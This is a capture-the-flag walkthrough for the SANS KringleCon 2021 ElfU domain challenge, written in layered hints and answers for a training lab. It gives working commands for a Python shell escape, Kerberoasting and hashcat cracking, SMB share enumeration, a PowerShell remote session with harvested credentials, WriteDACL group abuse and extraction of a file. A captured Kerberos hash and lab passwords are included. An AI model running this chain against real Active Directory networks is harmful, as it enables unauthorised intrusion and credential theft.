## Summary
This challenge opens up after finishing challenge 7 - Printer Exploitation.

**Objective**: "Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal (https://register.elfu.org/). Find Eve Snowshoes in Santa's office for hints."

From the challenge name and description, we know this will be a Windows domain and that we'll have to pivot/auth to the various hosts in the domain in order to find the secret sleigh research doc.

Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge in Santa's office:

<details>
  <summary>Eve Snowshoe's Hint</summary>
  https://www.youtube.com/watch?v=iMh8FTzepU4
  
  https://github.com/chrisjd20/hhc21_powershell_snippets
</details>

[Next Challenge](9%20-%20Splunk!.md)\
[Back to Table of Contents](https://github.com/minispooner/SANS_KringleCon_2021_Walkthrough/blob/main/README.md)

## Steps
1. Go to https://register.elfu.org/ and start hacking!

<details>
  <summary>Registration - Hint</summary>
  Just register with anything :)
</details>

<details>
  <summary>Initial Access After Registration - Hint 1</summary>
  Try breaking out of the program. How?
</details>
<details>
  <summary>Initial Access After Registration - Answer 1</summary>
  ctrl + d
</details>
<details>
  <summary>Initial Access After Registration - Hint 2</summary>
  How can we get a shell? What language are we in, often characterized by the ">>>"?
</details>
<details>
  <summary>Initial Access After Registration - Answer 2</summary>
  import os;os.system('/bin/bash')
</details>

<details>
  <summary>Escalation or Pivoting - Hint 1</summary>
  Kerberoasting on a open fire :)
</details>
<details>
  <summary>Escalation or Pivoting - Answer 1</summary>
  python3 GetUserSPNs.py elfu.local/USER:PASS -outputfile out.txt
</details>
<details>
  <summary>Escalation or Pivoting - Hint 2a</summary>
  Crack the hash by building a wordlist. But from where?
</details>
<details>
  <summary>Escalation or Pivoting - Hint 2b</summary>
  Try running cewl with certain flags on the registration page.
</details>
<details>
  <summary>Escalation or Pivoting - Answer 2</summary>
  git clone https://github.com/digininja/CeWL.git
  
  docker build -t cewl .
  
  docker run -it --rm -v "${PWD}:/host" cewl -w out.txt --with-numbers https://register.elfu.org/register
  
  ./hashcat/hashcat -m 13100 hash.txt CeWL/out.txt --rules OneRuleToRuleThemAll.rule #Snow2021!
</details>

<details>
  <summary>Escalation or Pivoting - Hint 3</summary>
  What does elfu_svc have access to on the network that you do not?
</details>
<details>
  <summary>Escalation or Pivoting - Answer 3</summary>

```
nmblookup -A 10.128.3.30
smbclient -L \\SHARE30 -I 10.128.3.30 -N
smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
```
</details>

<details>
  <summary>Escalation or Pivoting - Hint 4</summary>
  What could I use in here?
</details>
<details>
  <summary>Escalation or Pivoting - Answer 4</summary>
  get GetProcessInfo.ps1
  
  Find creds for RCE method inside GetProcessInfo.ps1
  
  pwsh -File GetProcessInfo.ps1 or pwsh -Command ./GetProcessInfo.ps1
</details>

<details>
  <summary>RCE - Hint 1</summary>
  What are the different ways I can get a shell or session on the remote host? We know it's the Domain Controller based on nmap scans.
</details>
<details>
  <summary>RCE - Answer 1</summary>
  Modify the RCE command for a session instead. Powershell has a built-in session setup command - https://github.com/chrisjd20/hhc21_powershell_snippets
</details>
<details>
  <summary>RCE - Hint 2</summary>
  It may work better if you can extract the cleartext password and pass that into the Enter-PSSession call.
</details>
<details>
  <summary>RCE - Answer 2</summary>
  $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
  
  Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
</details>

<details>
  <summary>Privilege Escalation - Hint 1</summary>
  Info: https://github.com/chrisjd20/hhc21_powershell_snippets
  
  Tip: $ldapConnString = "LDAP://CN=WHICH_GROUP_DO_WE_PROBABLY_WANT,CN=Users,DC=elfu,DC=local"
</details>
<details>
  <summary>Privilege Escalation - Hint 2</summary>
  Our objective is to get the research doc. Where should we look for it? How can we escalate privileges to get it? https://github.com/dirkjanm/ldapdomaindump
</details>
<details>
  <summary>Privilege Escalation - Answer</summary>
  When abusing the WriteDACL permission that remote_elf has, the first large chunk hhc21_powershell_snippets script uses the remote_elf permissions. 
  
  Another hhc21_powershell_snippets script assigns a group to the SSH user permissions. Which group looks familiar? The Research Group!
  
  Verify SSH username membership in the group:

```
pwsh
> net group "ResearchDepartment" /domain`
```
  
</details>

<details>
  <summary>Loot - Hint 1</summary>
  Remember the main objective is to get the research doc. Do you remember where you should have seen a likely place for research documents?
</details>
<details>
  <summary>Loot - Answer 1</summary>
  smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30
  
  get SantaSecretToAWonderfulHolidaySeason.pdf
</details>
<details>
  <summary>Loot - Hint 2</summary>
  How can we get this file from the SSH server to view it or read its data?
</details>
<details>
  <summary>Loot - Answer 2</summary>
  SCP doesn't work. Just copy paste it out. Or the linux binary "strings" may work.
  
```
openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
cat LOOT.pdf | tr -d '\n'
copy paste to host machine to view the PDF (save to loot.pdf)
cat loot.pdf | base64 -d > final.pdf
```

</details>



<br/>
<br/>
<br/>
<br/>
... WARNING ... SPOILERS & ANSWERS BELOW ...
<br/>
<br/>
<br/>
<br/>
<br/>
... WARNING ... SPOILERS & ANSWERS BELOW ...
<br/>
<br/>
<br/>
<br/>
<br/>
... WARNING ... SPOILERS & ANSWERS BELOW ...
<br/>
<br/>
<br/>
<br/>
<br/>
... WARNING ... SPOILERS & ANSWERS BELOW ...
<br/>
<br/>
<br/>
<br/>
<br/>
... WARNING ... SPOILERS & ANSWERS BELOW ...
<br/>
<br/>
<br/>
<br/>
<br/>

## Answer Walkthrough
Register with anything

It returns access creds:\
New Student Domain Account Creation Successful!\
You can now access the student network grading system by SSH'ing into this asset using the command below:\
`ssh knuefahyyw@grades.elfu.org -p 2222`\
ElfU Domain Username: knuefahyyw\
ElfU Domain Password: Sxdenyfaj#

### Shell escape
After SSHing in, run ctl d to escape into python, then get a an OS shell - pty.spawn() causes issues, so try os.system()

`import os;os.system('/bin/bash')`

### Kerberoasting
`python3 GetUserSPNs.py elfu.local/knuefahyyw:Sxdenyfaj# -outputfile out.txt`

### Hash Cracking
```
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$71ecc044c799e1aec5402fdf9e6a56e8$151441b8cd8fbd7d2fae74e70b4f6f17d04d5ceb469fd6c019b34b19342aaf5d1188d164344c499252c2248379f8acb1f1d0a550c9b9e694e2bf68fe4b71217566326235ecfad91fdf757be5bc76a71c8bc59cd3c7fd805b6f3560c91e870789d745bdde797f8de2d2e934966889abb8f9f42298eb8576a74e8f979090dfb817f8af86f81ead4912f814d4d959d4f3986f725990e2dafcbf86f7b8af927d2a9a8d91c853b51d0b444d069a508c9809f2ca47bdef2a2aeda54f74b4997e65c1fbfd598ccd1cca7e33e3c53a9a46b55a0382b1dff3cfcb57e385f3b1c5961ad062b57912722fd9257a763f42986a43882d486e8d9fe2c9097553535088ff24d5bebf21440e8a4803245066a5b3ca5e5a8fd5129e5cad8dd6c1c9ff0b590e83b60941334dfc54b2605b4383ba39ef3c766026506a0e9c68d55763664e014cd2f9047d8f9f9647d0f20e5eb1d22234da19a2232171fa845b7c24eccecda580758640b9208b1c4651a428327d02d3f7782d1c40f0e57b4251be51d7a96465041999bbd119108e4e72a81606d2eb658a5f8f747778b0e54c7fc5b2170361033bc8c2abd46708ca5aaeaa1c1aa9bbcff32d7f0e2c8c0eacf91d8b207f590c35c953b55bd4436539609cca09e70606668cd9fb3f9eff828b235503d660a20f573933a1a9b70898d59e607017bcc5d2f681f8a455e3ab34c93addee49898e4aa6ceda5aa790a74630f5a4f2274e32533089d211cae8f1b4fab69d63e65f8faa3141bbeced1482f677358a10f46fb0a450f56e5ec40bd1e0243064889bd2ea2e8b8304c3d83b176c18ae1742f7fa3065161464742dd51c69b17d91e7532771ee0431d70282644b370c165f4986a229c1df3a5c53958fc660f071afd44793b7e1a02177800e1281e7b3c904ce5b4786168e8c38355ada337fb312e61e03fa65c813469ea3328fc8192baa34e74601777b1a9520877640c1ecbf2924a43b31746ad07350f17adf9a14fb8766aeef82c6cd360afb69fe45eb1c0bd85b93e56bbe5b9dae6e1069baec0d36c03f33728e5f1364ee922c8795e4ca0a5660d05ec6c8af2342dbff0afe9d85bd61061efc4430445f7a5df95bc70393ec8d5ce0fb518d1f63f7ac8cf80337777198f2e760a6c6999ebe7662e315f05123dbb55f86ac200167ea661235f923d2ae144dec18f4eb4b70978a60e437ffa77eaefbe1ac35bfd5bd7bb14329e84f3e891fac45f6f050c79af6c3587d7a7938bd7b9030f00ea6d9d4232297bae10356b8dce7e6b094a563480f2570dba60337d2b1ab971cf1557220253f4ff88d96eff8b233b86195f3426bfbf84003e2d4a0ccbb8778b06ff0f9f3bee50f2365fa71daf8f54b82e864eabbf94bf66272a256af18c85c2208e3154676b3a1c46a39cddda6af6820227252b31866480f49dc06e59d3ec77659fbc070d496f1bc9745eed8f5
```
```
git clone https://github.com/digininja/CeWL.git
docker build -t cewl .
docker run -it --rm -v "${PWD}:/host" cewl -w out.txt --with-numbers https://register.elfu.org/register
./hashcat/hashcat -m 13100 hash.txt CeWL/out.txt --rules OneRuleToRuleThemAll.rule
echo "Snow2021!"
```

### Data Exfil for Secrets
```
nmblookup -A 10.128.3.30
smbclient -L \\SHARE30 -I 10.128.3.30 -N
smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
```
get GetProcessInfo.ps1\
Find creds for RCE method inside GetProcessInfo.ps1\
`pwsh -File GetProcessInfo.ps1` or `pwsh -Command ./GetProcessInfo.ps1`


### RCE
Modify the RCE command for a session instead\
Info: https://github.com/chrisjd20/hhc21_powershell_snippets \
Extract the clear-text password.
```
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
```

### Privilege Escalation
Info: https://github.com/chrisjd20/hhc21_powershell_snippets \
Tip: $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"\
Use https://github.com/dirkjanm/ldapdomaindump to identify remote_elf permissions and which group we want to add.\
The first large script chunk of the PS snippets uses the remote_elf permissions. The second large chunk script uses the SSH user permissions.\
Verify SSH username membership in the group:
```
pwsh
> net group "ResearchDepartment" /domain`
```

### THE LOOT!
After you've added the ResearchDepartment group to your SSH user, connect to their share and retreive the loot!\
`smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30`\
get SantaSecretToAWonderfulHolidaySeason.pdf
```
openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
cat LOOT.pdf | tr -d '\n'
copy paste to host machine to view the PDF (save to loot.pdf)
cat loot.pdf | base64 -d > final.pdf
```
